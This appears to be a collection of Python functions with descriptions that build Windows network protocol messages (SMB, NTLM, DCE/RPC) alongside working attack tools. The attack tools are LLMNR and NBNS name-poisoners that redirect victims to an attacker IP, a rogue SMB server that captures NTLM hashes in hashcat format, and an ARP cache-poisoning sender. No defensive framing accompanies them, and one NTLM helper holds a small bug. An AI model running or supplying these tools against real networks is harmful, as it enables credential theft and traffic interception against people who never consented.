smb_negotiate.code:
import struct
import socket
import os

def smb_negotiate(target_ip, target_port=445):
    """Send SMB1 Negotiate Protocol Request and return server response."""
    # SMB1 header: 32 bytes
    smb_magic = b'\xffSMB'  # 4 bytes
    command = 0x72  # SMB_COM_NEGOTIATE
    status = 0x00000000
    flags = 0x18  # case-sensitive pathnames, canonical pathnames
    flags2 = 0xC853  # unicode, NT status, extended security, long names
    pid_high = 0
    signature = b'\x00' * 8
    reserved = 0
    tid = 0x0000
    pid = os.getpid() & 0xFFFF
    uid = 0x0000
    mid = 0x0001
    header = smb_magic + struct.pack('<BIBHH8sHHHHH',
        command, status, flags, flags2, pid_high,
        signature, reserved, tid, pid, uid, mid)
    # Negotiate payload: WordCount=0, dialect strings
    dialects = [b'PC NETWORK PROGRAM 1.0', b'LANMAN1.0',
                b'Windows for Workgroups 3.1a', b'LM1.2X002',
                b'LANMAN2.1', b'NT LM 0.12', b'SMB 2.002', b'SMB 2.???']
    dialect_bytes = b''
    for d in dialects:
        dialect_bytes += b'\x02' + d + b'\x00'
    bcc = len(dialect_bytes)
    payload = struct.pack('<B', 0) + struct.pack('<H', bcc) + dialect_bytes
    smb_packet = header + payload
    # NetBIOS session header: 4 bytes (big-endian length)
    nb_header = struct.pack('>I', len(smb_packet))
    packet = nb_header + smb_packet
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((target_ip, target_port))
    sock.send(packet)
    resp = sock.recv(4096)
    sock.close()
    # Parse: skip 4-byte NB header, check SMB magic
    if resp[4:8] == b'\xffSMB':
        dialect_index = struct.unpack('<H', resp[37:39])[0]
        challenge = resp[73:81] if len(resp) > 80 else b''
        return {'dialect_index': dialect_index, 'challenge': challenge,
                'raw': resp, 'server_flags': struct.unpack('<H', resp[14:16])[0]}
    return {'raw': resp, 'error': 'unexpected_response'}
smb_negotiate.description: SMB1 Negotiate Protocol Request with dialect strings NT LM 0.12 and SMB 2.002/2.??? and server response parsing

ntlm_type1_message.code:
import struct

def ntlm_type1_message(domain='', workstation='', negotiate_flags=None):
    """Build NTLMSSP Negotiate (Type 1) message."""
    NTLMSSP_NEGOTIATE_56 = 0x80000000
    NTLMSSP_NEGOTIATE_KEY_EXCH = 0x40000000
    NTLMSSP_NEGOTIATE_128 = 0x20000000
    NTLMSSP_NEGOTIATE_NTLM = 0x00000200
    NTLMSSP_NEGOTIATE_UNICODE = 0x00000001
    NTLMSSP_REQUEST_TARGET = 0x00000004
    NTLMSSP_NEGOTIATE_ESS = 0x00080000
    NTLMSSP_NEGOTIATE_SIGN = 0x00000010
    NTLMSSP_NEGOTIATE_SEAL = 0x00000020
    NTLMSSP_NEGOTIATE_ALWAYS_SIGN = 0x00008000
    NTLMSSP_NEGOTIATE_TARGET_INFO = 0x00800000
    NTLMSSP_NEGOTIATE_WORKSTATION = 0x00002000
    NTLMSSP_NEGOTIATE_DOMAIN = 0x00001000
    if negotiate_flags is None:
        negotiate_flags = (NTLMSSP_NEGOTIATE_56 | NTLMSSP_NEGOTIATE_128 |
                          NTLMSSP_NEGOTIATE_KEY_EXCH | NTLMSSP_NEGOTIATE_NTLM |
                          NTLMSSP_NEGOTIATE_UNICODE | NTLMSSP_REQUEST_TARGET |
                          NTLMSSP_NEGOTIATE_ESS | NTLMSSP_NEGOTIATE_SIGN |
                          NTLMSSP_NEGOTIATE_SEAL | NTLMSSP_NEGOTIATE_ALWAYS_SIGN |
                          NTLMSSP_NEGOTIATE_TARGET_INFO)
    # Encode domain and workstation as OEM bytes
    domain_bytes = domain.encode('ascii') if domain else b''
    ws_bytes = workstation.encode('ascii') if workstation else b''
    if domain_bytes:
        negotiate_flags |= NTLMSSP_NEGOTIATE_DOMAIN
    if ws_bytes:
        negotiate_flags |= NTLMSSP_NEGOTIATE_WORKSTATION
    # Signature + MessageType + NegotiateFlags
    signature = b'NTLMSSP\x00'
    msg_type = struct.pack('<I', 1)
    flags = struct.pack('<I', negotiate_flags)
    # Payload offset starts after fixed 32-byte header
    payload_offset = 32
    # DomainNameFields: Len, MaxLen, Offset
    domain_fields = struct.pack('<HHI', len(domain_bytes), len(domain_bytes),
                                payload_offset + len(ws_bytes))
    # WorkstationFields: Len, MaxLen, Offset
    ws_fields = struct.pack('<HHI', len(ws_bytes), len(ws_bytes), payload_offset)
    msg = signature + msg_type + flags + domain_fields + ws_fields + ws_bytes + domain_bytes
    return msg
ntlm_type1_message.description: NTLMSSP Type 1 Negotiate message with configurable flags, domain and workstation fields per MS-NLMP

ntlm_type3_response.code:
import struct
import hashlib
import hmac
import os
import time

def ntlm_type3_response(username, password, domain, server_challenge, server_info=b''):
    """Compute NTLMv2 authentication (Type 3) response."""
    def _md4(data):
        return hashlib.new('md4', data).digest()
    def _hmac_md5(key, msg):
        return hmac.new(key, msg, hashlib.md5).digest()
    # Step 1: ResponseKeyNT = HMAC_MD5(MD4(UNICODE(password)), UNICODE(UPPER(username) + domain))
    nt_hash = _md4(password.encode('utf-16-le'))
    user_domain = (username.upper() + domain).encode('utf-16-le')
    response_key_nt = _hmac_md5(nt_hash, user_domain)
    # Step 2: Build NTLMv2 client blob (temp)
    client_challenge = os.urandom(8)
    # Windows FILETIME: 100ns intervals since 1601-01-01
    epoch_diff = 116444736000000000  # difference between 1601 and 1970 in 100ns
    timestamp = struct.pack('<Q', int(time.time() * 10000000) + epoch_diff)
    blob = b'\x01\x01'          # RespType, HiRespType
    blob += b'\x00\x00'          # Reserved1
    blob += b'\x00\x00\x00\x00'  # Reserved2
    blob += timestamp             # TimeStamp (8 bytes)
    blob += client_challenge      # ChallengeFromClient (8 bytes)
    blob += b'\x00\x00\x00\x00'  # Reserved3
    blob += server_info           # AvPairs from server challenge
    blob += b'\x00\x00\x00\x00'  # End padding
    # Step 3: NTProofStr = HMAC_MD5(ResponseKeyNT, ServerChallenge + blob)
    nt_proof_str = _hmac_md5(response_key_nt, server_challenge + blob)
    # Step 4: NtChallengeResponse = NTProofStr + blob
    nt_response = nt_proof_str + blob
    # Step 5: SessionBaseKey = HMAC_MD5(ResponseKeyNT, NTProofStr)
    session_base_key = _hmac_md5(response_key_nt, nt_proof_str)
    # Step 6: LM response for NTLMv2
    lm_response = _hmac_md5(response_key_nt, server_challenge + client_challenge) + client_challenge
    # Build Type 3 message
    sig = b'NTLMSSP\x00'
    msg_type = struct.pack('<I', 3)
    domain_enc = domain.encode('utf-16-le')
    user_enc = username.encode('utf-16-le')
    ws_enc = b'WORKSTATION\x00'.replace(b'\x00', b'').encode('utf-16-le')
    # Calculate offsets (after 88-byte fixed header)
    offset = 88
    lm_off = offset
    nt_off = lm_off + len(lm_response)
    dom_off = nt_off + len(nt_response)
    usr_off = dom_off + len(domain_enc)
    ws_off = usr_off + len(user_enc)
    sess_off = ws_off + len(ws_enc)
    flags = 0xE2888235  # Standard NTLMv2 flags
    hdr = sig + msg_type
    hdr += struct.pack('<HHI', len(lm_response), len(lm_response), lm_off)
    hdr += struct.pack('<HHI', len(nt_response), len(nt_response), nt_off)
    hdr += struct.pack('<HHI', len(domain_enc), len(domain_enc), dom_off)
    hdr += struct.pack('<HHI', len(user_enc), len(user_enc), usr_off)
    hdr += struct.pack('<HHI', len(ws_enc), len(ws_enc), ws_off)
    hdr += struct.pack('<HHI', 0, 0, sess_off)  # Encrypted session key (empty)
    hdr += struct.pack('<I', flags)
    payload = lm_response + nt_response + domain_enc + user_enc + ws_enc
    return {'message': hdr + payload, 'nt_proof_str': nt_proof_str,
            'session_base_key': session_base_key, 'nt_response': nt_response,
            'lm_response': lm_response, 'response_key_nt': response_key_nt}
ntlm_type3_response.description: NTLMv2 Type 3 authentication response with HMAC-MD5 computation of NTProofStr, SessionBaseKey and full message assembly

kerberos_as_req.description: Kerberos AS-REQ with PA-ENC-TIMESTAMP using RC4-HMAC, DER/ASN.1 TLV encoding, principal and realm construction

llmnr_poison_response.code:
import socket
import struct
import threading

def llmnr_poison_response(attacker_ip, interface_ip='0.0.0.0', timeout=60, callback=None):
    """LLMNR poisoner: listen on multicast 224.0.0.252:5355 and respond with attacker IP."""
    LLMNR_ADDR = '224.0.0.252'
    LLMNR_PORT = 5355
    results = []
    def _build_response(query_data, spoof_ip):
        # Parse query: TID (2) + Flags (2) + Questions (2) + ...
        tid = query_data[0:2]
        # Response flags: QR=1, opcode=0, C=0, TC=0, T=0
        flags = struct.pack('>H', 0x8000)
        qdcount = struct.pack('>H', 1)
        ancount = struct.pack('>H', 1)
        nscount = struct.pack('>H', 0)
        arcount = struct.pack('>H', 0)
        # Extract question section (starts at offset 12)
        qname_start = 12
        pos = qname_start
        while pos < len(query_data) and query_data[pos] != 0:
            pos += query_data[pos] + 1
        pos += 1  # null terminator
        qtype_qclass = query_data[pos:pos + 4]  # type + class (4 bytes)
        question = query_data[qname_start:pos + 4]
        # Answer section: same name, type A, class IN, TTL, IP
        answer = query_data[qname_start:pos]  # name
        answer += struct.pack('>HH', 1, 1)  # type A, class IN
        answer += struct.pack('>I', 30)  # TTL 30 seconds
        answer += struct.pack('>H', 4)  # RDLENGTH
        answer += socket.inet_aton(spoof_ip)
        resp = tid + flags + qdcount + ancount + nscount + arcount + question + answer
        return resp
    def _extract_name(data):
        pos = 12
        labels = []
        while pos < len(data) and data[pos] != 0:
            length = data[pos]
            labels.append(data[pos + 1:pos + 1 + length].decode('latin-1'))
            pos += length + 1
        return '.'.join(labels)
    def _listener():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('', LLMNR_PORT))
        # Join multicast group
        mreq = socket.inet_aton(LLMNR_ADDR) + socket.inet_aton(interface_ip)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        sock.settimeout(timeout)
        try:
            while True:
                data, addr = sock.recvfrom(1024)
                if len(data) < 12:
                    continue
                flags = struct.unpack('>H', data[2:4])[0]
                if flags & 0x8000:  # Skip responses (QR=1)
                    continue
                name = _extract_name(data)
                resp = _build_response(data, attacker_ip)
                sock.sendto(resp, addr)
                entry = {'client': addr[0], 'name': name, 'spoofed_to': attacker_ip}
                results.append(entry)
                if callback:
                    callback(entry)
        except socket.timeout:
            pass
        finally:
            sock.close()
    t = threading.Thread(target=_listener, daemon=True)
    t.start()
    return {'thread': t, 'results': results}
llmnr_poison_response.description: LLMNR multicast poisoner on 224.0.0.252:5355 that intercepts name queries and responds with attacker-controlled IP address

nbns_poison_response.code:
import socket
import struct
import threading

def nbns_poison_response(attacker_ip, bind_ip='0.0.0.0', timeout=60, callback=None):
    """NetBIOS Name Service (NBNS) poisoner on UDP/137."""
    NBNS_PORT = 137
    results = []
    def _decode_nbns_name(data):
        """Decode NetBIOS first-level encoding: each byte -> 2 chars (A-P)."""
        # Name starts at offset 13 (after length byte at 12), 32 bytes encoded
        encoded = data[13:45]
        name = ''
        for i in range(0, 32, 2):
            high = encoded[i] - ord('A')
            low = encoded[i + 1] - ord('A')
            ch = (high << 4) | low
            name += chr(ch)
        return name.rstrip(' ').rstrip('\x00')
    def _encode_nbns_name(name):
        """Encode name using NetBIOS first-level encoding."""
        padded = name.ljust(16, ' ')[:16]
        encoded = b''
        for ch in padded.encode('ascii'):
            high = (ch >> 4) + ord('A')
            low = (ch & 0x0F) + ord('A')
            encoded += struct.pack('BB', high, low)
        return encoded
    def _build_response(query_data, spoof_ip):
        tid = query_data[0:2]
        # Response flags: Response=1, Opcode=0, AA=1, RD=1, RA=1
        flags = struct.pack('>H', 0x8500)
        qdcount = struct.pack('>H', 0)
        ancount = struct.pack('>H', 1)
        nscount = struct.pack('>H', 0)
        arcount = struct.pack('>H', 0)
        header = tid + flags + qdcount + ancount + nscount + arcount
        # Answer: encoded name from query + NB record
        name_field = query_data[12:46]  # length byte + 32 encoded + null
        rr_name = struct.pack('B', 32) + name_field[1:33] + b'\x00'
        rr_type = struct.pack('>H', 0x0020)  # NB
        rr_class = struct.pack('>H', 0x0001)  # IN
        rr_ttl = struct.pack('>I', 300)
        rr_data = struct.pack('>H', 0x0000) + socket.inet_aton(spoof_ip)  # NB flags + IP
        rr_rdlen = struct.pack('>H', len(rr_data))
        answer = rr_name + rr_type + rr_class + rr_ttl + rr_rdlen + rr_data
        return header + answer
    def _listener():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((bind_ip, NBNS_PORT))
        sock.settimeout(timeout)
        try:
            while True:
                data, addr = sock.recvfrom(1024)
                if len(data) < 50:
                    continue
                # Check if it's a name query (opcode=0, QR=0)
                flags_val = struct.unpack('>H', data[2:4])[0]
                if flags_val & 0x8000:  # Response bit set, skip
                    continue
                if data[2:4] != b'\x01\x10' and not (flags_val & 0x0000 == 0):
                    continue
                name = _decode_nbns_name(data)
                resp = _build_response(data, attacker_ip)
                sock.sendto(resp, addr)
                entry = {'client': addr[0], 'name': name, 'spoofed_to': attacker_ip}
                results.append(entry)
                if callback:
                    callback(entry)
        except socket.timeout:
            pass
        finally:
            sock.close()
    t = threading.Thread(target=_listener, daemon=True)
    t.start()
    return {'thread': t, 'results': results}
nbns_poison_response.description: NetBIOS Name Service poisoner on UDP/137 with first-level name encoding/decoding and spoofed NB response records

rogue_smb_auth_server.code:
import socket
import struct
import os
import threading

def rogue_smb_auth_server(listen_ip='0.0.0.0', listen_port=445, callback=None):
    """Rogue SMB server capturing NTLMv2 hashes in hashcat format."""
    captured = []
    def _handle(conn, addr):
        try:
            chall = os.urandom(8)
            data = conn.recv(4096)
            if not data: return
            if data[0:1] == b'\x81': conn.send(b'\x82\x00\x00\x00'); data = conn.recv(4096)
            if len(data) < 36 or data[8] != 0x72: return
            pid, mid = data[30:32], data[34:36]
            # Build SMB negotiate response with NTLMSSP Type 2 challenge
            hdr = b'\xffSMB' + struct.pack('<BIBH', 0x72, 0, 0x88, 0xC801) + b'\x00' * 12
            hdr += b'\x00\x00' + pid + b'\x00\x00' + mid
            ntlm2 = b'NTLMSSP\x00' + struct.pack('<I', 2) + struct.pack('<HHI', 0, 0, 56)
            ntlm2 += struct.pack('<I', 0x00028233) + chall + b'\x00' * 8 + struct.pack('<HHI', 0, 0, 56)
            body = struct.pack('<BHB2HI I I I', 17, 0, 3, 1, 1, 16644, 65536, 0, 0x80000004)
            body += b'\x00' * 8 + struct.pack('<hB', 0, 0) + struct.pack('<H', len(ntlm2)) + ntlm2
            pkt = hdr + body
            conn.send(struct.pack('>I', len(pkt)) + pkt)
            data = conn.recv(4096)
            if not data or len(data) < 60: return
            off = data.find(b'NTLMSSP')
            if off < 0: return
            s = data[off:]
            nt_len = struct.unpack('<H', s[20:22])[0]; nt_off = struct.unpack('<I', s[24:28])[0]
            dom_len = struct.unpack('<H', s[28:30])[0]; dom_off = struct.unpack('<I', s[32:36])[0]
            usr_len = struct.unpack('<H', s[36:38])[0]; usr_off = struct.unpack('<I', s[40:44])[0]
            domain = s[dom_off:dom_off+dom_len].decode('utf-16-le', errors='ignore')
            user = s[usr_off:usr_off+usr_len].decode('utf-16-le', errors='ignore')
            nt_hex = s[nt_off:nt_off+nt_len].hex().upper()
            ch_hex = chall.hex().upper()
            if nt_len > 24:
                h = '%s::%s:%s:%s:%s' % (user, domain, ch_hex, nt_hex[:32], nt_hex[32:])
                htype = 'NTLMv2'
            else:
                h = '%s::%s:%s:%s' % (user, domain, ch_hex, nt_hex); htype = 'NTLMv1'
            entry = {'client': addr[0], 'username': user, 'domain': domain, 'hash_type': htype, 'hashcat_hash': h}
            captured.append(entry)
            if callback: callback(entry)
        except Exception: pass
        finally: conn.close()
    def _srv():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.bind((listen_ip, listen_port))
        s.listen(5); s.settimeout(120)
        try:
            while True:
                c, a = s.accept(); threading.Thread(target=_handle, args=(c, a), daemon=True).start()
        except socket.timeout: pass
        finally: s.close()
    t = threading.Thread(target=_srv, daemon=True); t.start()
    return {'thread': t, 'captured': captured}
rogue_smb_auth_server.description: Rogue SMB server capturing NTLMv1/v2 hashes via NTLMSSP negotiate-challenge-auth flow, outputting hashcat-compatible format

dcerpc_bind_request.code:
import struct
import os

def dcerpc_bind_request(interface_uuid, interface_version=(1, 0), call_id=1, max_xmit=4280, max_recv=4280):
    """Construct a DCE/RPC Bind packet for a given interface UUID."""
    NDR_UUID = 'e404524e-2b27-1d16-993a-0800095a4700'  # NDR transfer syntax (actually 8a885d04...)
    NDR_UUID_REAL = '8a885d04-1ceb-11c9-9fe8-08002b104860'  # Standard NDR 2.0
    NDR_VERSION = (2, 0)
    def _uuid_to_bytes(uuid_str):
        """Convert UUID string to DCE/RPC wire format (mixed-endian)."""
        parts = uuid_str.replace('-', '')
        # DCE/RPC UUID: first 3 components little-endian, last 2 big-endian
        p1 = struct.pack('<I', int(parts[0:8], 16))
        p2 = struct.pack('<H', int(parts[8:12], 16))
        p3 = struct.pack('<H', int(parts[12:16], 16))
        p4 = bytes.fromhex(parts[16:20])
        p5 = bytes.fromhex(parts[20:32])
        return p1 + p2 + p3 + p4 + p5
    # DCE/RPC header (v5.0)
    rpc_version = 5
    rpc_version_minor = 0
    ptype = 11  # Bind
    pfc_flags = 0x03  # PFC_FIRST_FRAG | PFC_LAST_FRAG
    data_representation = struct.pack('<I', 0x00000010)  # little-endian, ASCII, IEEE float
    # Context element
    ctx_id = 0
    num_trans_items = 1
    abstract_syntax = _uuid_to_bytes(interface_uuid)
    abstract_version = struct.pack('<HH', interface_version[0], interface_version[1])
    transfer_syntax = _uuid_to_bytes(NDR_UUID_REAL)
    transfer_version = struct.pack('<HH', NDR_VERSION[0], NDR_VERSION[1])
    # Context list
    ctx_item = struct.pack('<HBx', ctx_id, num_trans_items)  # ctx_id, num_trans, padding
    ctx_item += abstract_syntax + abstract_version
    ctx_item += transfer_syntax + transfer_version
    # Bind body: max_xmit, max_recv, assoc_group, ctx_list
    num_ctx_items = 1
    bind_body = struct.pack('<HHI', max_xmit, max_recv, 0)  # assoc_group=0
    bind_body += struct.pack('<Bxxx', num_ctx_items)  # num_ctx + padding
    bind_body += ctx_item
    # Calculate total fragment length
    header_len = 16  # fixed header
    frag_length = header_len + len(bind_body)
    auth_length = 0
    # Assemble header
    header = struct.pack('<BBBB', rpc_version, rpc_version_minor, ptype, pfc_flags)
    header += data_representation
    header += struct.pack('<HH', frag_length, auth_length)
    header += struct.pack('<I', call_id)
    packet = header + bind_body
    return {'packet': packet, 'interface': interface_uuid,
            'transfer_syntax': NDR_UUID_REAL, 'call_id': call_id}
dcerpc_bind_request.description: DCE/RPC Bind request with version 5.0 header, abstract syntax interface UUID, NDR 2.0 transfer syntax and context negotiation

arp_spoof_reply.code:
import struct
import socket
import os

def arp_spoof_reply(target_ip, gateway_ip, attacker_mac, target_mac, interface='eth0', count=1):
    """Craft and send ARP reply for cache poisoning (raw socket)."""
    def _mac_to_bytes(mac_str):
        """Convert MAC address string (aa:bb:cc:dd:ee:ff) to 6 bytes."""
        return bytes.fromhex(mac_str.replace(':', '').replace('-', ''))
    def _ip_to_bytes(ip_str):
        """Convert dotted IP string to 4 bytes."""
        return socket.inet_aton(ip_str)
    dst_mac = _mac_to_bytes(target_mac)
    src_mac = _mac_to_bytes(attacker_mac)
    target_ip_bytes = _ip_to_bytes(target_ip)
    gateway_ip_bytes = _ip_to_bytes(gateway_ip)
    # Ethernet frame header
    eth_header = struct.pack('!6s6sH',
        dst_mac,       # destination MAC (victim)
        src_mac,       # source MAC (attacker)
        0x0806         # EtherType: ARP
    )
    # ARP header
    arp_header = struct.pack('!HHBBH',
        0x0001,   # Hardware type: Ethernet
        0x0800,   # Protocol type: IPv4
        6,        # Hardware address length
        4,        # Protocol address length
        0x0002    # Opcode: ARP Reply
    )
    # ARP payload: sender = attacker pretending to be gateway
    arp_payload = struct.pack('!6s4s6s4s',
        src_mac,           # Sender hardware address (attacker MAC)
        gateway_ip_bytes,  # Sender protocol address (gateway IP — the lie)
        dst_mac,           # Target hardware address (victim MAC)
        target_ip_bytes    # Target protocol address (victim IP)
    )
    frame = eth_header + arp_header + arp_payload
    # Send via raw socket (AF_PACKET, requires Linux + root)
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        sock.bind((interface, 0))
        sent = 0
        for _ in range(count):
            sock.send(frame)
            sent += 1
        sock.close()
        return {'success': True, 'frames_sent': sent, 'frame_hex': frame.hex(),
                'target': target_ip, 'spoofed_as': gateway_ip,
                'attacker_mac': attacker_mac}
    except (OSError, AttributeError) as e:
        # AF_PACKET not available (macOS/Windows) — return crafted frame
        return {'success': False, 'error': str(e), 'frame': frame,
                'frame_hex': frame.hex(), 'frame_len': len(frame),
                'target': target_ip, 'spoofed_as': gateway_ip}
arp_spoof_reply.description: ARP cache poisoning reply with crafted Ethernet frame and ARP header, associating attacker MAC with gateway IP at victim

smb2_negotiate.code:
import socket
import struct
import os

def smb2_negotiate(host, port=445, timeout=5.0):
    """SMB2 Negotiate Protocol Request with dialect detection."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((host, port))
    # SMB2 Header (64 bytes)
    smb2_header = struct.pack('<4s', b'\xfeSMB')      # Protocol ID
    smb2_header += struct.pack('<H', 64)                # Header Length
    smb2_header += struct.pack('<H', 0)                 # Credit Charge
    smb2_header += struct.pack('<I', 0)                 # Status
    smb2_header += struct.pack('<H', 0)                 # Command: NEGOTIATE
    smb2_header += struct.pack('<H', 0)                 # Credits Requested
    smb2_header += struct.pack('<I', 0)                 # Flags
    smb2_header += struct.pack('<I', 0)                 # Next Command
    smb2_header += struct.pack('<Q', 1)                 # Message ID
    smb2_header += struct.pack('<I', 0)                 # Process ID
    smb2_header += struct.pack('<I', 0)                 # Tree ID
    smb2_header += struct.pack('<Q', 0)                 # Session ID
    smb2_header += b'\x00' * 16                          # Signature
    # SMB2 Negotiate Request body
    dialects = [0x0202, 0x0210, 0x0300, 0x0302, 0x0311]  # SMB 2.0.2 - 3.1.1
    negotiate = struct.pack('<H', 36)                    # Structure Size
    negotiate += struct.pack('<H', len(dialects))        # Dialect Count
    negotiate += struct.pack('<H', 1)                    # Security Mode (signing enabled)
    negotiate += struct.pack('<H', 0)                    # Reserved
    negotiate += struct.pack('<I', 0x7f)                 # Capabilities
    negotiate += os.urandom(16)                          # Client GUID
    negotiate += struct.pack('<I', 0)                    # Negotiate Context Offset
    negotiate += struct.pack('<H', 0)                    # Negotiate Context Count
    negotiate += struct.pack('<H', 0)                    # Reserved2
    for d in dialects:
        negotiate += struct.pack('<H', d)
    # NetBIOS Session Service header (4 bytes)
    message = smb2_header + negotiate
    netbios = struct.pack('>I', len(message))
    netbios = bytes([0]) + netbios[1:]  # Session Message type = 0x00
    sock.send(netbios + message)
    # Parse response
    resp = sock.recv(4096)
    if len(resp) < 68:
        sock.close()
        return {'error': 'short_response', 'bytes': len(resp)}
    # Skip 4-byte NetBIOS + 64-byte SMB2 header = offset 68 for Negotiate Response
    status = struct.unpack('<I', resp[12:16])[0]
    neg_off = 4 + 64  # netbios(4) + smb2_header(64)
    dialect = struct.unpack('<H', resp[neg_off + 4:neg_off + 6])[0] if len(resp) > neg_off + 6 else 0
    sec_mode = struct.unpack('<H', resp[neg_off + 2:neg_off + 4])[0] if len(resp) > neg_off + 4 else 0
    server_guid = resp[neg_off + 8:neg_off + 24] if len(resp) > neg_off + 24 else b''
    capabilities = struct.unpack('<I', resp[neg_off + 24:neg_off + 28])[0] if len(resp) > neg_off + 28 else 0
    max_transact = struct.unpack('<I', resp[neg_off + 28:neg_off + 32])[0] if len(resp) > neg_off + 32 else 0
    max_read = struct.unpack('<I', resp[neg_off + 32:neg_off + 36])[0] if len(resp) > neg_off + 36 else 0
    max_write = struct.unpack('<I', resp[neg_off + 36:neg_off + 40])[0] if len(resp) > neg_off + 40 else 0
    sock.close()
    DIALECT_NAMES = {0x0202: 'SMB2.0.2', 0x0210: 'SMB2.1', 0x0300: 'SMB3.0', 0x0302: 'SMB3.0.2', 0x0311: 'SMB3.1.1'}
    return {
        'status': status,
        'dialect': '0x{:04x}'.format(dialect),
        'dialect_name': DIALECT_NAMES.get(dialect, 'unknown'),
        'security_mode': sec_mode,
        'signing_required': bool(sec_mode & 0x02),
        'server_guid': server_guid.hex() if server_guid else '',
        'capabilities': capabilities,
        'max_transact_size': max_transact,
        'max_read_size': max_read,
        'max_write_size': max_write,
    }
smb2_negotiate.description: SMB2 Negotiate Protocol Request with 5 dialects (2.0.2 through 3.1.1), 64-byte SMB2 header construction, NetBIOS session framing, and response parsing for dialect selection, signing requirements, server GUID, and max transfer sizes
